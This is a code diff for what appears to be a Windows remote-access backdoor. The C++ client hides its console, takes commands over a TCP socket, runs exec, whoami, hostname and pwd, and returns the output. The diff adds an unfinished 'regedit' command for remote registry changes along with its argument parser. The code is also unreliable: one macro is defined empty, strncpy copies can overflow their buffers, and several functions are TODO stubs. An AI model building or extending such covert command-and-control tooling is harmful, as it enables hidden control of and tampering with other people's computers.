@@ -1,4 +1,4 @@
-//C++ Headers
+//Win Headers
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
@@ -6,7 +6,7 @@
 //C Headers
 #include <stdio.h>
 
-// #define DEBUG 1
+#define DEBUG 1
 
 //Debug Headers
 #ifdef DEBUG
@@ -17,8 +17,13 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 //Global variables
-#define DEFAULT_BUFLEN 1024
+#define DEFAULT_BUFLEN 5120
 #define RESP_BUFLEN 258
+#define REGFUN_LEN 16
+#define REGKEY_LEN 256
+#define REGSUBKEY_LEN 16384
+#define REGVAL_LEN 1025
+#define REG_BUFLEN 
 
 
 void StealthConsole();
@@ -30,9 +35,10 @@ void whoami(char* returnval, int returnsize);
 void hostname(char* returnval, int returnsize);
 void pwd(char* returnval, int returnsize);
 void exec(char* returnval, int returnsize, char* args);
+void regedit(char* returnval, int returnsize, char* args);
 
-bool IfExec(char* cmd);
-void SplitArgs(char* returnval, char* cmd);
+bool IfCommand(char* cmd, char* toCompare);
+void ParseRegArgs(char* cmd);
 
 
 int main() {
@@ -133,13 +139,13 @@ void ParseCmd(char* cmd, SOCKET tcpsock) {
         WSACleanup();
         exit(0);
     }
-    else if (IfExec(cmd)) {                                //exec
+    else if (IfCommand(cmd, "exec")) {                      //exec
 #ifdef DEBUG
         std::cout << "Command parsed: exec\n";
 #endif
 
         char args[DEFAULT_BUFLEN] = "";
-        SplitArgs(args, cmd);
+        strncpy(args, cmd + 5, strlen(cmd));
 
 #ifdef DEBUG
         std::cout << "Arguments parsed: ";
@@ -151,7 +157,13 @@ void ParseCmd(char* cmd, SOCKET tcpsock) {
         strcat(buffer, "\n");
         send(tcpsock, buffer, strlen(buffer) + 1, 0);
     }
-    else {
+    else if (IfCommand(cmd, "regedit")){                    //regedit
+#ifdef DEBUG
+        std::cout << "Command parsed: regedit\n";
+#endif
+        //TODO
+    }
+    else {                                                  //invalid
 #ifdef DEBUG
         std::cout << "Command not parsed!\n";
 #endif
@@ -188,10 +200,14 @@ void exec(char* returnval, int returnsize, char* args) {
     }
 }
 
-bool IfExec(char* cmd) {
+void regedit(char* returnval, int returnsize, char* args) {
+    //TODO
+}
+
+bool IfCommand(char* cmd, char* toCompare) {
     char split_val[DEFAULT_BUFLEN] = ""; 
     for (int i = 0; i < DEFAULT_BUFLEN; ++i) {
-        if (cmd[i] == *" ") {
+        if (cmd[i] == ' ') {
             break;
         }
         else {
@@ -199,13 +215,51 @@ bool IfExec(char* cmd) {
         }
     }
 
-    return (strcmp(split_val, "exec") == 0);
+    return (strcmp(split_val, toCompare) == 0);
 }
 
-void SplitArgs(char* returnval, char* cmd) {
+void ParseRegArgs(char* cmd) {
+    //In development
+    char function[REGFUN_LEN] = "";
     int j = 0;
-    for (int i = 5; i < DEFAULT_BUFLEN; ++i) {
-        returnval[j] = cmd[i];
-        ++j;
+    int i = 8;
+    for (i; i < REGFUN_LEN; ++i) {
+        if (cmd[i] == ' ') {
+            i++;
+            break;
+        }
+        else {
+            function[j] = cmd[i];
+            j++;
+        }
     }
+
+    char hkey[REGKEY_LEN] = "";
+    j = 0;
+    for (i; i < REGFUN_LEN + REGKEY_LEN; ++i) {
+        if (cmd[i] == ' ') {
+            i++;
+            break;
+        }
+        else {
+            hkey[j] = cmd[i];
+            j++;
+        }
+    }
+
+    char lpSubKey[REGSUBKEY_LEN] = "";
+    j = 0;
+    for (i; i < REGFUN_LEN + REGKEY_LEN + REGSUBKEY_LEN; ++i) {
+        if (cmd[i] == ' ') {
+            i++;
+            break;
+        }
+        else {
+            lpSubKey[j] = cmd[i];
+            j++;
+        }
+    }
+
+    char lpValue[REGVAL_LEN] = "";
+    strncpy(lpValue, cmd + 8 + 3 + strlen(function) + strlen(hkey) + strlen(lpSubKey), strlen(cmd));
 }
